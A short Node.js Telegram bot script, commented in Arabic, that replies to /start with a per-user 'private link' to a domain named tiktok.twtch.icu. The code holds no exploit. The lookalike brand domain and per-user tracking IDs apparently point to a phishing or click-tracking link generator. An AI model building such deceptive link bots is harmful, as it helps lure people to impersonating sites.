const TelegramBot = require("node-telegram-bot-api");

// التوكن من Render (Environment Variable)
const token = process.env.BOT_TOKEN;

const bot = new TelegramBot(token, { polling: true });

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // رابط خاص لكل مستخدم
  const link = `https://tiktok.twtch.icu?video?id=${userId}`;

  bot.sendMessage(chatId,
`👋 مرحبا!

🔗 هذا رابطك الخاص:
${link}

📌 استعمله فقط أنت`
  );
});